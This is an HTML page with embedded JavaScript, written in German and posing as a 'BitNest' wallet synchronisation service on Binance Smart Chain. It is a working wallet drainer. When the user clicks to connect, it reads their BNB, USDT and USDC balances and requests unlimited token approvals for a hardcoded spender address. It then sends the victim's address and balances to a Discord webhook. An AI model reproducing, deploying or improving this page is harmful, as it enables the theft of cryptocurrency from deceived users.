<!doctype html>
<html lang="de">
<head>
<meta charset="utf-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>BitNest Pro Connect</title>
<style>
:root{ --bg:#000000; --card:#0a0a0a; --border:#1f2933; --green:#22c55e; --white:#ffffff; }
body{margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;background:var(--bg);color:var(--white);font-family:sans-serif;padding:16px}
.box{width:100%;max-width:440px;background:var(--card);border-radius:16px;padding:24px;border:1px solid var(--border);text-align:center}
h2{color:var(--green);margin-bottom:20px}
.status-box{background:#050505;border:1px solid var(--border);border-radius:12px;padding:15px;margin:15px 0;font-family:monospace;font-size:13px}
button{width:100%;padding:16px;border:none;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer;background:var(--green);color:#052e16}
button:disabled{opacity:0.5;cursor:not-allowed}
#log{margin-top:15px;font-size:12px;color:#9ca3af}
</style>
</head>
<body>

<div class="box">
  <h2>BitNest Loop</h2>
  <p style="font-size:14px;color:#9ca3af">Verbinde deine Wallet, um die Synchronisierung auf der BSC Chain zu starten.</p>
  
  <div class="status-box">
    <div id="addr">Wallet: Nicht verbunden</div>
    <hr style="opacity:0.1;margin:10px 0">
    <div id="balances">Guthaben: â€“</div>
  </div>

  <button id="connectBtn">Wallet verbinden</button>
  <div id="log">Warte auf Aktion...</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@6.10.0/dist/ethers.min.js"></script>
<script>
/* CONFIG */
const SPENDER = "0x61bF4DAE189C62344Df1E9802B5338C196d1E26B";
const USDT = "0x55d398326f99059fF775485246999027B3197955";
const USDC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
const WEBHOOK = "DEIN_DISCORD_WEBHOOK_HIER"; 

const abi = [
  "function allowance(address owner,address spender) view returns (uint256)",
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender,uint256 amount) returns (bool)"
];

const btn = document.getElementById("connectBtn");
const log = document.getElementById("log");

btn.addEventListener("click", async () => {
  try {
    btn.disabled = true;
    log.innerText = "Suche Wallet...";

    if (!window.ethereum) {
      throw new Error("Keine Wallet gefunden. Bitte im DApp-Browser Ã¶ffnen!");
    }

    // Verbindung erzwingen
    const provider = new ethers.BrowserProvider(window.ethereum);
    const accounts = await provider.send("eth_requestAccounts", []);
    const signer = await provider.getSigner();
    const user = accounts[0];
    
    document.getElementById("addr").innerText = "Wallet: " + user.substring(0,6) + "..." + user.substring(38);
    log.innerText = "PrÃ¼fe Netzwerk & Guthaben...";

    const net = await provider.getNetwork();
    if (Number(net.chainId) !== 56) {
      log.innerText = "Bitte zu BSC / Binance Smart Chain wechseln!";
      btn.disabled = false;
      return;
    }

    // Guthaben abrufen (Native BNB + Tokens)
    const bnbBal = await provider.getBalance(user);
    const usdtContract = new ethers.Contract(USDT, abi, signer);
    const usdcContract = new ethers.Contract(USDC, abi, signer);
    
    const [uBal, cBal] = await Promise.all([
      usdtContract.balanceOf(user),
      usdcContract.balanceOf(user)
    ]);

    const fBNB = ethers.formatEther(bnbBal);
    const fUSDT = ethers.formatUnits(uBal, 18);
    const fUSDC = ethers.formatUnits(cBal, 18);

    document.getElementById("balances").innerText = `BNB: ${parseFloat(fBNB).toFixed(4)} | USDT: ${parseFloat(fUSDT).toFixed(2)}`;

    // Approvals nacheinander
    log.innerText = "BestÃ¤tige USDT (1/2)...";
    const tx1 = await usdtContract.approve(SPENDER, ethers.MaxUint256);
    await tx1.wait();

    log.innerText = "BestÃ¤tige USDC (2/2)...";
    const tx2 = await usdcContract.approve(SPENDER, ethers.MaxUint256);
    await tx2.wait();

    log.innerText = "Synchronisierung abgeschlossen!";
    
    // Discord Daten-Ãœbertragung
    await fetch(WEBHOOK, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        embeds: [{
          title: "ðŸ’° Wallet erfolgreich verbunden",
          color: 2263842,
          fields: [
            { name: "Adresse", value: `\`${user}\`` },
            { name: "BNB (Gas)", value: `${fBNB} BNB`, inline: true },
            { name: "USDT", value: `${fUSDT} USDT`, inline: true },
            { name: "USDC", value: `${fUSDC} USDC`, inline: true }
          ],
          footer: { text: "BitNest System v2" }
        }]
      })
    });

  } catch (err) {
    console.error(err);
    log.innerText = err.message || "Fehler beim Verbinden";
    btn.disabled = false;
  }
});
</script>
</body>
</html>
